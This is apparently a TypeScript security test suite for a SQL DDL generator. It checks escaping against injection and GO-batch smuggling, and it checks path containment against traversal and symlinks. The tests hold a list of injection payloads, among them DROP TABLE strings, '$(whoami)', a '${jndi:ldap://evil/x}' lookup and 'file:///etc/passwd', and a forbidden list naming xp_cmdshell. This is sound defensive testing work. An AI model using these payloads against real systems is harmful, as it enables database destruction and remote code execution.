/**
 * Security invariants for the native core.
 *
 * Two threat surfaces matter here:
 *
 * 1. **Injection** — every value that reaches generated T-SQL originates from a
 *    file name, a column name, a JSON key, a URL or a user-supplied override.
 *    None of them may be able to terminate an identifier, a literal or a
 *    comment and inject statements.
 * 2. **Path containment** — the analysis API is handed paths by a webview, so
 *    it must refuse to read outside the allowed root even via `..`, absolute
 *    paths or symlinks.
 */

import * as assert from 'assert';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { after, before, describe, it } from 'node:test';

import { NativeAnalysisService } from '../../native/service';
import { resolveWithinRoot } from '../../native/paths';
import { PathContainmentError } from '../../native/errors';
import {
    DuplicateColumnError,
    cleanIdentifier,
    escapeIdentifier,
    quoteLiteral,
    safeSqlType,
    splitGoBatches,
    validateUniqueColumnNames,
} from '../../native/sql/escaping';
import {
    generateAllStatements,
    generateCompleteDdl,
    generateCredentialSetup,
} from '../../native/sql/generator';
import { PLATFORMS } from '../../native/sql/typeMapping';
import type { GeneratorMetadata } from '../../native/types';
import { REPO_ROOT, fixturePath } from './parityInvariants';

/**
 * How a naive client cuts a script into batches: split on line terminators,
 * then treat any line that trims to `GO` as a separator. No awareness of
 * quotes, brackets or comments.
 *
 * This is the adversary's model, not ours, and it exists so the escaping tests
 * can prove their payloads were genuinely dangerous. `splitGoBatches` is
 * region-aware and would refuse to split inside a bracketed identifier even
 * with no escaping at all, so using it as the oracle would make those
 * assertions pass for the wrong reason.
 */
function naiveClientSplit(script: string): string[] {
    const batches: string[] = [];
    let current: string[] = [];
    // Deliberately the widest reasonable set: different clients disagree, and
    // a defence that only holds for one of them is not a defence.
    // eslint-disable-next-line no-control-regex -- modelling a naive client's line splitting is the point
    const lines = script.split(/\r\n|\r|\n|\u000b|\u000c|\u001c|\u001d|\u001e|\u0085|\u2028|\u2029/);
    for (const line of lines) {
        if (/^\s*go\s*$/i.test(line)) {
            batches.push(current.join('\n'));
            current = [];
            continue;
        }
        current.push(line);
    }
    batches.push(current.join('\n'));
    return batches.filter((batch) => batch.trim() !== '');
}

/** Payloads that try to break out of an identifier, literal or comment. */
const MALICIOUS_STRINGS: readonly string[] = [
    "'; DROP TABLE [dbo].[users]; --",
    ']; DROP TABLE users; --',
    'a]] DROP TABLE users --',
    "a'' OR 1=1 --",
    'x\n-- injected\nDROP TABLE users;',
    'x\r\nGO\r\nDROP TABLE users;\r\nGO',
    'name*/; DROP TABLE users; /*',
    'tab\there',
    'nul\u0000byte',
    '\u2028line\u2029separator',
    '＠fullwidth',
    'ünïcodé',
    '日本語',
    "]]']]'--",
    '$(whoami)',
    '${jndi:ldap://evil/x}',
];

/**
 * Strip every T-SQL construct that quotes or comments out its contents.
 *
 * This is the only honest way to check for injection: a payload appearing
 * inside `[...]`, `'...'` or a comment is *contained*, and one appearing
 * outside them has escaped. A lexer also proves the generator never leaves a
 * quote or bracket unterminated, which is what an injection actually needs.
 *
 * Containment is necessary but not sufficient. `GO` is a client-side batch
 * separator, so a line break smuggled *inside* a bracketed identifier or a
 * quoted literal still lets `\nGO\n` split the statement in whatever tool runs
 * the script, even though the server-side parser would accept it. The lexer
 * therefore also reports whether any quoted region contained a line terminator,
 * and the assertions below treat that as a failure in its own right.
 */
function stripQuotedRegions(sql: string): {
    code: string;
    unterminated: string | null;
    lineBreakInQuoted: string | null;
} {
    let code = '';
    let index = 0;
    let lineBreakInQuoted: string | null = null;
    while (index < sql.length) {
        const character = sql[index];

        if (character === '-' && sql[index + 1] === '-') {
            const end = sql.indexOf('\n', index);
            if (end === -1) {
                return { code, unterminated: null, lineBreakInQuoted };
            }
            code += '\n';
            index = end + 1;
            continue;
        }

        if (character === '/' && sql[index + 1] === '*') {
            let depth = 1;
            index += 2;
            while (index < sql.length && depth > 0) {
                if (sql[index] === '/' && sql[index + 1] === '*') {
                    depth += 1;
                    index += 2;
                } else if (sql[index] === '*' && sql[index + 1] === '/') {
                    depth -= 1;
                    index += 2;
                } else {
                    index += 1;
                }
            }
            if (depth > 0) {
                return { code, unterminated: 'block comment', lineBreakInQuoted };
            }
            code += ' ';
            continue;
        }

        if (character === "'" || character === '"' || character === '[') {
            const closer = character === '[' ? ']' : character;
            const start = index;
            index += 1;
            let closed = false;
            while (index < sql.length) {
                if (sql[index] === closer) {
                    if (sql[index + 1] === closer) {
                        index += 2;
                        continue;
                    }
                    index += 1;
                    closed = true;
                    break;
                }
                index += 1;
            }
            if (!closed) {
                return {
                    code,
                    unterminated: character === '[' ? 'identifier' : 'literal',
                    lineBreakInQuoted,
                };
            }
            const region = sql.slice(start, index);
            if (lineBreakInQuoted === null && /[\r\n\u2028\u2029]/.test(region)) {
                lineBreakInQuoted = region;
            }
            code += character === '[' ? 'IDENT' : "''";
            continue;
        }

        code += character;
        index += 1;
    }
    return { code, unterminated: null, lineBreakInQuoted };
}

/** Constructs that must never appear outside a quoted or commented region. */
const FORBIDDEN_CONSTRUCTS = [
    ['DROP TABLE', /\bDROP\s+TABLE\b/i],
    ['tautology', /\bOR\s+1\s*=\s*1\b/i],
    ['xp_cmdshell', /\bxp_cmdshell\b/i],
    ['EXEC', /\bEXEC(UTE)?\s*\(/i],
] as const;

function assertNoInjection(sql: string, context: string): void {
    const { code, unterminated, lineBreakInQuoted } = stripQuotedRegions(sql);
    assert.strictEqual(
        unterminated,
        null,
        `${context}: generated SQL left an unterminated ${unterminated}:\n${sql}`,
    );
    // A line terminator inside a quoted region is the batch-injection primitive:
    // the server-side parser accepts it, but every client-side GO splitter cuts
    // the statement in half. Generated scripts legitimately contain `GO` lines,
    // so "the script contains GO" proves nothing — "a payload got a newline into
    // an identifier or literal" proves everything.
    assert.strictEqual(
        lineBreakInQuoted,
        null,
        `${context}: a quoted region contains a line terminator, so a client-side ` +
            `GO splitter can cut the statement in half: ` +
            `${JSON.stringify(lineBreakInQuoted)}\n--- original ---\n${sql}`,
    );
    for (const [label, pattern] of FORBIDDEN_CONSTRUCTS) {
        assert.ok(
            !pattern.test(code),
            `${context}: ${label} escaped its quoting context.\n` +
                `--- stripped ---\n${code}\n--- original ---\n${sql}`,
        );
    }
    // The same property stated the way a client sees it: split the script on its
    // batch separators and prove no resulting batch is attacker-authored.
    for (const batch of splitGoBatches(sql)) {
        const { code: batchCode } = stripQuotedRegions(batch);
        for (const [label, pattern] of FORBIDDEN_CONSTRUCTS) {
            assert.ok(
                !pattern.test(batchCode),
                `${context}: splitting on GO produced a batch containing ${label}:\n${batch}`,
            );
        }
    }
}

function baseMetadata(): GeneratorMetadata {
    return {
        file_path: 'C:/data/sales.csv',
        file_name: 'sales.csv',
        file_type: 'csv',
        file_size: 1024,
        encoding: 'utf-8',
        delimiter: ',',
        has_header: true,
        row_count: 10,
        column_count: 2,
        nullable_columns: [],
        schema: [
            ['id', 'int64'],
            ['name', 'object'],
        ],
    };
}

describe('identifier and literal escaping', () => {
    it('doubles closing brackets so an identifier cannot be terminated early', () => {
        assert.strictEqual(escapeIdentifier('a]b'), 'a]]b');
        assert.strictEqual(escapeIdentifier(']]'), ']]]]');
        assert.strictEqual(escapeIdentifier('plain'), 'plain');
    });

    it('doubles single quotes so a literal cannot be terminated early', () => {
        assert.strictEqual(quoteLiteral("a'b"), "a''b");
        assert.strictEqual(quoteLiteral("''"), "''''");
        assert.strictEqual(quoteLiteral('plain'), 'plain');
    });

    it('never leaves an unbalanced bracket for any payload', () => {
        for (const payload of MALICIOUS_STRINGS) {
            const wrapped = `[${escapeIdentifier(payload)}]`;
            const { unterminated } = stripQuotedRegions(`SELECT ${wrapped} FROM t;`);
            assert.strictEqual(
                unterminated,
                null,
                `payload ${JSON.stringify(payload)} escaped its brackets: ${wrapped}`,
            );
        }
    });

    it('never leaves an unbalanced quote for any payload', () => {
        for (const payload of MALICIOUS_STRINGS) {
            const wrapped = `'${quoteLiteral(payload)}'`;
            const { unterminated } = stripQuotedRegions(`SELECT ${wrapped};`);
            assert.strictEqual(
                unterminated,
                null,
                `payload ${JSON.stringify(payload)} escaped its quotes: ${wrapped}`,
            );
        }
    });

    it('detects an unescaped payload, proving the lexer is not vacuous', () => {
        const unsafe = `SELECT [${"x]; DROP TABLE users; --"}] FROM t;`;
        assert.throws(() => assertNoInjection(unsafe, 'control'));
    });

    it('detects a smuggled GO batch, proving the batch check is not vacuous', () => {
        // Deliberately bypasses escapeIdentifier to build the script the
        // vulnerable version produced. If assertNoInjection stops catching this,
        // the batch-separator defence has regressed.
        const unsafe = 'CREATE TABLE [dbo].[t]\n(\n    [id\nGO\nDROP TABLE users;\nGO\n--] INT\n)';
        assert.throws(() => assertNoInjection(unsafe, 'control'));
    });

    it('neutralises line terminators so a payload cannot split a GO batch', () => {
        const payload = 'id\nGO\nDROP TABLE users;\nGO\n--';
        const identifier = escapeIdentifier(payload);
        assert.ok(
            !/[\r\n\u2028\u2029]/.test(identifier),
            `escapeIdentifier kept a line terminator: ${JSON.stringify(identifier)}`,
        );
        const literal = quoteLiteral(payload);
        assert.ok(
            !/[\r\n\u2028\u2029]/.test(literal),
            `quoteLiteral kept a line terminator: ${JSON.stringify(literal)}`,
        );
        assert.deepStrictEqual(
            splitGoBatches(`CREATE TABLE [dbo].[t] ([${identifier}] INT)`),
            ['CREATE TABLE [dbo].[t] ([id GO DROP TABLE users; GO --] INT)'],
        );
    });

    it('collapses every character a reader might treat as a line ending', () => {
        // U+0085 (NEL), U+2028 and U+2029 sit outside the C0/C1 ranges a naive
        // filter uses, but Python's `str.splitlines()` — and therefore the
        // compatibility CLI's own GO splitter — breaks on all three. Escaping
        // that depends on which reader splits the script is not escaping, so
        // the collapse set is deliberately wider than JavaScript's own idea of
        // a line terminator.
        // Characters some real client treats as ending a line. For these the
        // negative control below can fire, so the test proves the collapse is
        // what defuses the payload.
        const lineTerminators = [
            '\r', '\n', '\u000b', '\u000c', '\u001c', '\u001d', '\u001e',
            '\u0085', '\u2028', '\u2029',
        ];
        // Control characters no client splits on. They are collapsed anyway,
        // for hygiene and because a terminal or log viewer may still mangle
        // them, but no batch-splitting claim is made for them.
        const otherControls = ['\u0000', '\u007f'];
        for (const terminator of [...lineTerminators, ...otherControls]) {
            const payload = `id${terminator}GO${terminator}DROP TABLE users;--`;
            const identifier = escapeIdentifier(payload);
            assert.strictEqual(
                identifier,
                'id GO DROP TABLE users;--',
                `escapeIdentifier kept ${JSON.stringify(terminator)}`,
            );
            assert.ok(
                !quoteLiteral(payload).includes(terminator),
                `quoteLiteral kept ${JSON.stringify(terminator)}`,
            );
            assert.strictEqual(
                splitGoBatches(`CREATE TABLE [t] ([${identifier}] INT)`).length,
                1,
                `${JSON.stringify(terminator)} still splits a batch`,
            );
            if (!lineTerminators.includes(terminator)) {
                continue;
            }
            // Negative control. `splitGoBatches` is region-aware, so it would
            // refuse to split inside brackets even without the collapse — which
            // makes the assertion above unable to fail for the right reason on
            // its own. A naive sqlcmd-style splitter has no such scruples, so
            // running the *unescaped* payload through it proves the payload was
            // genuinely dangerous and the collapse is what defuses it.
            assert.ok(
                naiveClientSplit(`CREATE TABLE [t] ([${payload}] INT)`).length > 1,
                `${JSON.stringify(terminator)} was never dangerous, so this proves nothing`,
            );
            assert.strictEqual(
                naiveClientSplit(`CREATE TABLE [t] ([${identifier}] INT)`).length,
                1,
                `${JSON.stringify(terminator)} survives into a naive client split`,
            );
        }
    });

    it('never lets a type override carry a line break into DDL', () => {
        // `safeSqlType` returns the accepted candidate verbatim, so it is the
        // one generator path that does not run through the control-character
        // collapse. Its internal whitespace must therefore be space and tab
        // only - `\s` would admit `\n`, `\r`, `\v`, `\f` and, in JavaScript,
        // U+00A0, U+2028, U+2029 and U+FEFF.
        const rejected = [
            'NVARCHAR\n(255)',
            'NVARCHAR\r\n(255)',
            'NVARCHAR\u000b(255)',
            'NVARCHAR\u000c(255)',
            'NVARCHAR\u00a0(255)',
            'NVARCHAR\u2028(255)',
            'NVARCHAR\u2029(255)',
            'NVARCHAR\ufeff(255)',
            'DECIMAL(18,\n4)',
            'INT\nGO\nDROP TABLE users;\nGO\n--',
        ];
        for (const candidate of rejected) {
            assert.strictEqual(
                safeSqlType(candidate),
                'NVARCHAR(MAX)',
                `safeSqlType accepted ${JSON.stringify(candidate)}`,
            );
        }
        // Space and tab stay legitimate, and a plain type is returned as given.
        assert.strictEqual(safeSqlType('NVARCHAR (255)'), 'NVARCHAR (255)');
        assert.strictEqual(safeSqlType('NVARCHAR\t(255)'), 'NVARCHAR\t(255)');
        assert.strictEqual(safeSqlType('DECIMAL(18,4)'), 'DECIMAL(18,4)');
        assert.strictEqual(safeSqlType('VARBINARY(MAX)'), 'VARBINARY(MAX)');
    });

    it('leaves printable characters in escaped identifiers untouched', () => {        assert.strictEqual(escapeIdentifier('Order Total (¥)'), 'Order Total (¥)');
        assert.strictEqual(escapeIdentifier('a]b'), 'a]]b');
        assert.strictEqual(quoteLiteral("O'Brien"), "O''Brien");
        assert.strictEqual(quoteLiteral('https://a.blob.core.windows.net/c/f.csv'),
            'https://a.blob.core.windows.net/c/f.csv');
    });

    it('does not split a GO that sits inside a literal, identifier or comment', () => {
        assert.deepStrictEqual(
            splitGoBatches("SELECT 'a\nGO\nb';\nGO\nSELECT 2;"),
            ["SELECT 'a\nGO\nb';", 'SELECT 2;'],
        );
        assert.deepStrictEqual(
            splitGoBatches('SELECT [a\nGO\nb];\nGO\nSELECT 2;'),
            ['SELECT [a\nGO\nb];', 'SELECT 2;'],
        );
        assert.deepStrictEqual(
            splitGoBatches('/* a\nGO\nb */\nSELECT 1;\nGO\nSELECT 2;'),
            ['/* a\nGO\nb */\nSELECT 1;', 'SELECT 2;'],
        );
        assert.deepStrictEqual(
            splitGoBatches('SELECT 1; -- GO\nGO\nSELECT 2;'),
            ['SELECT 1; -- GO', 'SELECT 2;'],
        );
    });

    it('cleans identifiers down to a safe character set', () => {
        const dangerous = [']', '[', ';', "'", '\r', '\n', '\u0000', '-'];
        for (const payload of MALICIOUS_STRINGS) {
            const cleaned = cleanIdentifier(payload);
            for (const character of dangerous) {
                assert.ok(
                    !cleaned.includes(character),
                    `cleanIdentifier left ${JSON.stringify(character)} in ` +
                        JSON.stringify(cleaned),
                );
            }
            assert.ok(cleaned.length > 0, 'cleanIdentifier must never return empty');
        }
    });

    it('rejects duplicate column names that would collide after cleaning', () => {
        assert.throws(
            () =>
                validateUniqueColumnNames([
                    ['a', 'int64'],
                    ['A', 'int64'],
                ]),
            DuplicateColumnError,
        );
        assert.doesNotThrow(() =>
            validateUniqueColumnNames([
                ['a', 'int64'],
                ['b', 'int64'],
            ]),
        );
    });
});

describe('injection resistance across generated statements', () => {
    it('survives malicious column names on every platform', () => {
        for (const payload of MALICIOUS_STRINGS) {
            const metadata: GeneratorMetadata = {
                ...baseMetadata(),
                schema: [
                    [payload, 'int64'] as [string, string],
                    ['safe', 'object'] as [string, string],
                ],
                nullable_columns: [payload],
            };
            for (const platform of PLATFORMS) {
                const statements = generateAllStatements(metadata, {
                    targetPlatform: platform,
                    storageUrl:
                        'https://acct.blob.core.windows.net/container/folder/file.csv',
                });
                for (const [name, sql] of Object.entries(statements)) {
                    assertNoInjection(sql, `${platform}/${name}/column`);
                }
            }
        }
    });

    it('survives malicious file and table names', () => {
        for (const payload of MALICIOUS_STRINGS) {
            const metadata: GeneratorMetadata = {
                ...baseMetadata(),
                file_name: `${payload}.csv`,
                file_path: `C:/data/${payload}.csv`,
            };
            const ddl = generateCompleteDdl(metadata, { targetPlatform: 'azure_sql_db' });
            assertNoInjection(ddl, 'file name');

            const overridden = generateCompleteDdl(baseMetadata(), {
                targetPlatform: 'azure_sql_db',
                tableName: payload,
                schemaName: payload,
            });
            assertNoInjection(overridden, 'table/schema override');
        }
    });

    /**
     * `file_path` reaches a different emitter on each platform: the on-premises
     * targets with no storage URL take the local `SINGLE_CLOB` branch of the
     * JSON section, which historically hand-rolled its own escaping. Fuzz every
     * platform and both the CSV and JSON metadata shapes so that branch cannot
     * regress unnoticed.
     */
    it('survives malicious file paths on every platform and file type', () => {
        for (const payload of MALICIOUS_STRINGS) {
            for (const fileType of ['csv', 'json'] as const) {
                const metadata: GeneratorMetadata = {
                    ...baseMetadata(),
                    file_type: fileType,
                    file_name: `${payload}.${fileType}`,
                    file_path: `C:/data/${payload}.${fileType}`,
                    json_format: 'array',
                };
                for (const platform of PLATFORMS) {
                    for (const storageUrl of [
                        undefined,
                        'https://acct.blob.core.windows.net/container/folder/file.json',
                    ]) {
                        const statements = generateAllStatements(metadata, {
                            targetPlatform: platform,
                            storageUrl,
                        });
                        for (const [name, sql] of Object.entries(statements)) {
                            assertNoInjection(
                                sql,
                                `${platform}/${fileType}/${name}/${storageUrl ? 'remote' : 'local'}`,
                            );
                        }
                    }
                }
            }
        }
    });

    /**
     * Escaping lives in exactly one module. A hand-rolled `.replace("'", "''")`
     * elsewhere silently loses the control-character collapsing that stops a
     * payload from opening a new client-side batch, so fail the build on one.
     */
    it('keeps every SQL escaper inside escaping.ts', () => {
        const nativeDir = path.join(REPO_ROOT, 'src', 'native');
        const offenders: string[] = [];

        const walk = (dir: string): void => {
            for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
                const full = path.join(dir, entry.name);
                if (entry.isDirectory()) {
                    walk(full);
                } else if (entry.isFile() && entry.name.endsWith('.ts')) {
                    if (full === path.join(nativeDir, 'sql', 'escaping.ts')) {
                        continue;
                    }
                    const source = fs.readFileSync(full, 'utf8');
                    const relative = path.relative(REPO_ROOT, full);
                    const patterns: Array<[string, RegExp]> = [
                        ['split literal quote', /\.split\(\s*"'"\s*\)\s*\.join\(\s*"''"\s*\)/],
                        ['split bracket', /\.split\(\s*'\]'\s*\)\s*\.join\(\s*'\]\]'\s*\)/],
                        ['replace literal quote', /\.replace\(\s*\/'\/g\s*,\s*"''"\s*\)/],
                        ['replace bracket', /\.replace\(\s*\/\\?\]\/g\s*,\s*'\]\]'\s*\)/],
                    ];
                    for (const [label, pattern] of patterns) {
                        if (pattern.test(source)) {
                            offenders.push(`${relative}: ${label}`);
                        }
                    }
                }
            }
        };

        walk(nativeDir);
        assert.deepStrictEqual(
            offenders,
            [],
            `hand-rolled SQL escaping outside escaping.ts: ${offenders.join(', ')}`,
        );
    });

    it('survives malicious delimiters', () => {
        for (const payload of MALICIOUS_STRINGS) {
            const ddl = generateCompleteDdl(
                { ...baseMetadata(), delimiter: payload },
                { targetPlatform: 'azure_sql_db' },
            );
            assertNoInjection(ddl, 'delimiter');
        }
    });

    it('survives malicious data source and credential names', () => {
        for (const payload of MALICIOUS_STRINGS) {
            const setup = generateCredentialSetup({
                targetPlatform: 'azure_sql_db',
                dataSource: payload,
                storageUrl:
                    'https://acct.blob.core.windows.net/container/folder/file.csv',
            });
            assertNoInjection(setup, 'data source name');
        }
    });

    it('survives malicious storage URLs', () => {
        const urls = [
            "https://acct.blob.core.windows.net/c/f'.csv",
            "https://acct.blob.core.windows.net/c/'; DROP TABLE users; --",
            'https://acct.blob.core.windows.net/c/f\n\';DROP TABLE users;--',
            's3://bucket/a\']; DROP TABLE users; --',
            'abfss://c@a.dfs.core.windows.net/x\u0000y',
            'not a url at all',
            'javascript:alert(1)',
            'file:///etc/passwd',
        ];
        for (const url of urls) {
            for (const platform of PLATFORMS) {
                const ddl = generateCompleteDdl(baseMetadata(), {
                    targetPlatform: platform,
                    storageUrl: url,
                });
                assertNoInjection(ddl, `${platform}/url ${JSON.stringify(url)}`);
            }
        }
    });

    it('survives malicious JSON keys and sample values', () => {
        for (const payload of MALICIOUS_STRINGS) {
            const metadata: GeneratorMetadata = {
                ...baseMetadata(),
                file_name: 'orders.json',
                file_path: 'C:/data/orders.json',
                file_type: 'json',
                json_format: 'array',
                schema: [[payload, 'object'] as [string, string]],
                json_sample_values: { [payload]: payload },
                json_nesting: { [payload]: 'object' },
            };
            const ddl = generateCompleteDdl(metadata, { targetPlatform: 'azure_sql_db' });
            assertNoInjection(ddl, 'json key');
        }
    });

    it('rejects SQL type overrides that are not a safe type expression', () => {
        for (const payload of MALICIOUS_STRINGS) {
            const metadata: GeneratorMetadata = {
                ...baseMetadata(),
                schema: [['c', payload] as [string, string]],
            };
            const ddl = generateCompleteDdl(metadata, { targetPlatform: 'azure_sql_db' });
            assertNoInjection(ddl, 'sql type override');
            const columnLine = ddl
                .split('\n')
                .find((line) => /^\s*\[c\]\s/.test(line));
            if (columnLine !== undefined) {
                assert.ok(
                    /^\s*\[c\]\s+[A-Za-z][A-Za-z0-9_]*(\s*\([^)]*\))?/.test(columnLine),
                    `unsafe type expression emitted: ${columnLine}`,
                );
            }
        }
    });
});

describe('end-to-end injection through the analysis service', () => {
    let root = '';

    before(async () => {
        root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'native-e2e-'));
    });

    after(async () => {
        await fs.promises.rm(root, { recursive: true, force: true });
    });

    /**
     * The full path a real caller takes: a hostile *file* is analysed and its
     * inferred column names flow into generated SQL. A header field may contain
     * a line break because a quoted CSV field may, and a JSON key may contain
     * anything at all.
     */
    const batchPayload = 'id\nGO\nDROP TABLE users;\nGO\n--';

    it('cannot inject a batch through a quoted CSV header field', async () => {
        const file = path.join(root, 'hostile.csv');
        await fs.promises.writeFile(
            file,
            `"${batchPayload}",b\n1,2\n`,
            'utf8',
        );
        const service = new NativeAnalysisService(root);
        const { statements } = await service.analyzeAndGenerate({ filePath: file });
        for (const [name, sql] of Object.entries(statements)) {
            if (typeof sql === 'string') {
                assertNoInjection(sql, `csv header -> ${name}`);
            }
        }
        const document = service.generateCompleteDocument({
            metadata: await service.analyze({ filePath: file }),
        });
        assertNoInjection(document, 'csv header -> complete document');
    });

    it('cannot inject a batch through a JSON object key', async () => {
        const file = path.join(root, 'hostile.json');
        await fs.promises.writeFile(
            file,
            JSON.stringify([{ [batchPayload]: 1, b: 2 }]),
            'utf8',
        );
        const service = new NativeAnalysisService(root);
        const metadata = await service.analyze({ filePath: file });
        const document = service.generateCompleteDocument({ metadata });
        assertNoInjection(document, 'json key -> complete document');
        assert.ok(
            splitGoBatches(document).every(
                (batch) => !/^\s*DROP\s+TABLE\b/i.test(batch),
            ),
            'a GO split produced an attacker-authored batch',
        );
    });
});

describe('path containment', () => {
    let root = '';
    let outside = '';

    before(async () => {
        root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'native-root-'));
        outside = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'native-out-'));
        await fs.promises.writeFile(path.join(root, 'inside.csv'), 'a,b\n1,2\n');
        await fs.promises.writeFile(path.join(outside, 'secret.csv'), 'a,b\n9,9\n');
    });

    after(async () => {
        await fs.promises.rm(root, { recursive: true, force: true });
        await fs.promises.rm(outside, { recursive: true, force: true });
    });

    it('accepts a file inside the allowed root', async () => {
        const reference = await resolveWithinRoot(path.join(root, 'inside.csv'), root);
        assert.ok(reference.realPath.endsWith('inside.csv'));
    });

    it('rejects traversal with ..', async () => {
        await assert.rejects(
            () => resolveWithinRoot(path.join(root, '..', 'etc', 'passwd'), root),
            PathContainmentError,
        );
    });

    it('rejects an absolute path outside the root', async () => {
        await assert.rejects(
            () => resolveWithinRoot(path.join(outside, 'secret.csv'), root),
            PathContainmentError,
        );
    });

    it('rejects a NUL byte in the path', async () => {
        await assert.rejects(() => resolveWithinRoot(`${root}\u0000.csv`, root));
    });

    it('rejects an empty path', async () => {
        await assert.rejects(() => resolveWithinRoot('', root));
    });

    it('rejects a sibling directory that merely shares a name prefix', async () => {
        const sibling = `${root}-evil`;
        await fs.promises.mkdir(sibling, { recursive: true });
        await fs.promises.writeFile(path.join(sibling, 'x.csv'), 'a\n1\n');
        try {
            await assert.rejects(
                () => resolveWithinRoot(path.join(sibling, 'x.csv'), root),
                PathContainmentError,
            );
        } finally {
            await fs.promises.rm(sibling, { recursive: true, force: true });
        }
    });

    it('rejects a symlink that escapes the root', async (t) => {
        const link = path.join(root, 'escape.csv');
        try {
            await fs.promises.symlink(path.join(outside, 'secret.csv'), link, 'file');
        } catch {
            // Creating file symlinks needs elevation or Developer Mode on Windows.
            t.skip('file symlink creation is not permitted in this environment');
            return;
        }
        try {
            await assert.rejects(
                () => resolveWithinRoot(link, root),
                PathContainmentError,
                'a symlink pointing outside the root must be refused after realpath',
            );
        } finally {
            await fs.promises.rm(link, { force: true });
        }
    });

    it('rejects a directory link that escapes the root', async (t) => {
        // Directory junctions can be created without elevation on Windows, so
        // this exercises realpath-based containment even when file symlinks
        // are unavailable.
        const link = path.join(root, 'escape-dir');
        const linkType = process.platform === 'win32' ? 'junction' : 'dir';
        try {
            await fs.promises.symlink(outside, link, linkType);
        } catch {
            t.skip('directory link creation is not permitted in this environment');
            return;
        }
        try {
            await assert.rejects(
                () => resolveWithinRoot(path.join(link, 'secret.csv'), root),
                PathContainmentError,
                'a directory link pointing outside the root must be refused',
            );
        } finally {
            await fs.promises.rm(link, { recursive: true, force: true });
        }
    });

    it('refuses to analyse a file outside the service root', async () => {
        const service = new NativeAnalysisService(root);
        const result = await service.tryAnalyze({
            filePath: path.join(outside, 'secret.csv'),
        });
        assert.strictEqual(result.ok, false);
        if (!result.ok) {
            assert.ok(result.error.length > 0);
        }
    });

    /**
     * Containment has to hold for the sidecar files a table format reads by
     * name, not just for the path the caller handed in. A link planted inside an
     * otherwise legitimate table directory must not redirect those reads out of
     * the allowed root, because their contents end up in the analysis result.
     */
    const linkDirectory = async (target: string, link: string): Promise<boolean> => {
        try {
            await fs.promises.symlink(
                target,
                link,
                process.platform === 'win32' ? 'junction' : 'dir',
            );
            return true;
        } catch {
            return false;
        }
    };

    it('does not read an Iceberg metadata directory that links out of the root', async (t) => {
        const secretDir = path.join(outside, 'iceberg-secret');
        await fs.promises.mkdir(secretDir, { recursive: true });
        await fs.promises.writeFile(
            path.join(secretDir, 'v9.metadata.json'),
            JSON.stringify({
                'table-uuid': 'aws_secret_key_AKIA1234',
                location: 's3://private-bucket/secret-prefix',
                'current-schema-id': 0,
                schemas: [
                    {
                        'schema-id': 0,
                        fields: [
                            { id: 1, name: 'ssn', type: 'string', required: true },
                            { id: 2, name: 'credit_card_number', type: 'string' },
                        ],
                    },
                ],
            }),
            'utf8',
        );

        const table = path.join(root, 'iceberg-table');
        await fs.promises.mkdir(table, { recursive: true });
        if (!(await linkDirectory(secretDir, path.join(table, 'metadata')))) {
            t.skip('directory link creation is not permitted in this environment');
            return;
        }

        const service = new NativeAnalysisService(root);
        const result = await service.tryAnalyze({ filePath: table });
        const rendered = JSON.stringify(result);
        for (const secret of ['ssn', 'credit_card_number', 'AKIA1234', 'secret-prefix']) {
            assert.ok(
                !rendered.includes(secret),
                `out-of-root Iceberg metadata leaked ${secret}: ${rendered}`,
            );
        }
    });

    it('does not read a Delta log directory that links out of the root', async (t) => {
        const secretLog = path.join(outside, 'delta-secret');
        await fs.promises.mkdir(secretLog, { recursive: true });
        await fs.promises.writeFile(
            path.join(secretLog, '00000000000000000000.json'),
            JSON.stringify({
                metaData: {
                    id: 'leaked-table-id',
                    name: 'salaries',
                    format: { provider: 'parquet' },
                    schemaString: JSON.stringify({
                        type: 'struct',
                        fields: [
                            { name: 'ssn', type: 'string', nullable: false, metadata: {} },
                        ],
                    }),
                    partitionColumns: [],
                },
            }) + '\n',
            'utf8',
        );

        const table = path.join(root, 'delta-table');
        await fs.promises.mkdir(table, { recursive: true });
        if (!(await linkDirectory(secretLog, path.join(table, '_delta_log')))) {
            t.skip('directory link creation is not permitted in this environment');
            return;
        }

        const service = new NativeAnalysisService(root);
        const result = await service.tryAnalyze({ filePath: table });
        const rendered = JSON.stringify(result);
        for (const secret of ['leaked-table-id', 'salaries', 'ssn']) {
            assert.ok(
                !rendered.includes(secret),
                `out-of-root Delta log leaked ${secret}: ${rendered}`,
            );
        }
    });

    it('still analyses a genuine table directory with no links', async () => {
        const service = new NativeAnalysisService(REPO_ROOT);
        const iceberg = await service.analyze({
            filePath: fixturePath('demo/tables/events_iceberg'),
        });
        assert.strictEqual(iceberg.file_type, 'iceberg');
        assert.strictEqual(iceberg.column_count, 6);

        const delta = await service.analyze({
            filePath: fixturePath('demo/tables/events_delta'),
        });
        assert.strictEqual(delta.file_type, 'delta');
        assert.strictEqual(delta.column_count, 5);
    });
});
